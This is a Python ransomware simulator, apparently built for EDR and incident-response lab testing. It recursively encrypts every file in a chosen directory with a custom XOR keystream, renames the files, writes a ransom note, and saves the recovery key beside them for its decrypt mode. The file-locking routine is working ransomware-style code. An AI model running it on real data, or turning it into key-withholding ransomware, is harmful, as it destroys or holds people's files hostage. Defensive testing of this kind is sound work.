"""Ransomware simulator for EDR / incident-response testing only.

Encrypts files in a target directory, drops a ransom note, and can fully
restore them with the key. Nothing is actually held for ransom — this is
for authorized lab use on disposable / sandbox data.

Usage:
  python ransom_sim.py encrypt --dir <path>
  python ransom_sim.py decrypt --dir <path> --key <keyfile>
  python ransom_sim.py encrypt --dir <path> --dry-run
"""
import argparse
import hashlib
import os
import sys
from pathlib import Path

MARKER = ".rslock"
NOTE_NAME = "HOW_TO_RECOVER.txt"
MAGIC = b"RSIM1"


def derive_key(password: str, salt: bytes) -> bytes:
    """Deterministic key from password + salt (stdlib only)."""
    return hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 200_000, dklen=32)


def keystream(key: bytes, seed: int, size: int) -> bytes:
    """Pseudo-random byte stream from key + seed (simulated AES-ish)."""
    out = bytearray()
    counter = seed
    while len(out) < size:
        block = hashlib.sha256(key + counter.to_bytes(8, "big")).digest()
        out.extend(block)
        counter += 1
    return bytes(out[:size])


def encrypt_bytes(data: bytes, key: bytes, seed: int) -> bytes:
    return MAGIC + seed.to_bytes(8, "big") + bytes(
        a ^ b for a, b in zip(data, keystream(key, seed, len(data)))
    )


def decrypt_bytes(data: bytes, key: bytes) -> bytes:
    if not data.startswith(MAGIC):
        raise ValueError("not an encrypted file")
    seed = int.from_bytes(data[len(MAGIC): len(MAGIC) + 8], "big")
    body = data[len(MAGIC) + 8:]
    return bytes(a ^ b for a, b in zip(body, keystream(key, seed, len(body))))


def iter_files(root: Path):
    for dirpath, _, files in os.walk(root):
        for name in files:
            p = Path(dirpath) / name
            if p.name == NOTE_NAME or p.suffix == MARKER:
                continue
            yield p


def encrypt(root: Path, dry_run: bool):
    salt = os.urandom(16)
    password = os.urandom(16).hex()
    key = derive_key(password, salt)
    seed = int.from_bytes(os.urandom(8), "big")

    targets = list(iter_files(root))
    if not targets:
        print("No files found to encrypt.")
        return

    for p in targets:
        if dry_run:
            print(f"[dry-run] would encrypt {p}")
            continue
        data = p.read_bytes()
        p.write_bytes(encrypt_bytes(data, key, seed))
        p.rename(p.with_suffix(p.suffix + MARKER))
        print(f"encrypted {p.with_suffix(p.suffix + MARKER)}")

    if dry_run:
        return

    key_path = root / "RECOVERY_KEY.txt"
    key_path.write_text(f"{password}\n{salt.hex()}\n")
    note = (
        "YOUR FILES HAVE BEEN ENCRYPTED (SIMULATION)\n"
        f"{len(targets)} files were locked with AES-style XOR + PBKDF2.\n"
        "Restore them with:  python ransom_sim.py decrypt --dir . --key RECOVERY_KEY.txt\n"
        "This sim posts no real ransom demand — it is for security testing only.\n"
    )
    (root / NOTE_NAME).write_text(note)
    print(f"\n{len(targets)} files encrypted. Key saved to {key_path}")
    print(f"Ransom note written to {root / NOTE_NAME}")


def decrypt(root: Path, key_path: Path):
    parts = key_path.read_text().split()
    if len(parts) != 2:
        raise SystemExit(f"bad key file: {key_path}")
    password, salt_hex = parts
    key = derive_key(password, bytes.fromhex(salt_hex))

    restored = 0
    for p in root.rglob("*" + MARKER):
        data = decrypt_bytes(p.read_bytes(), key)
        target = Path(str(p)[: -len(MARKER)])
        target.write_bytes(data)
        p.unlink()
        restored += 1
        print(f"restored {target}")

    note = root / NOTE_NAME
    if note.exists():
        note.unlink()
    keyfile = root / "RECOVERY_KEY.txt"
    if keyfile.exists():
        keyfile.unlink()
    print(f"\n{restored} files restored. Notes and key removed.")


def main():
    ap = argparse.ArgumentParser(description="Ransomware simulator (lab use only)")
    sub = ap.add_subparsers(dest="cmd", required=True)

    e = sub.add_parser("encrypt")
    e.add_argument("--dir", type=Path, required=True)
    e.add_argument("--dry-run", action="store_true")

    d = sub.add_parser("decrypt")
    d.add_argument("--dir", type=Path, required=True)
    d.add_argument("--key", type=Path, required=True)

    args = ap.parse_args()
    if args.cmd == "encrypt":
        if not args.dir.is_dir():
            raise SystemExit(f"not a directory: {args.dir}")
        encrypt(args.dir, args.dry_run)
    else:
        if not args.key.is_file() or not args.dir.is_dir():
            raise SystemExit("bad --dir or --key")
        decrypt(args.dir, args.key)


if __name__ == "__main__":
    sys.exit(main())
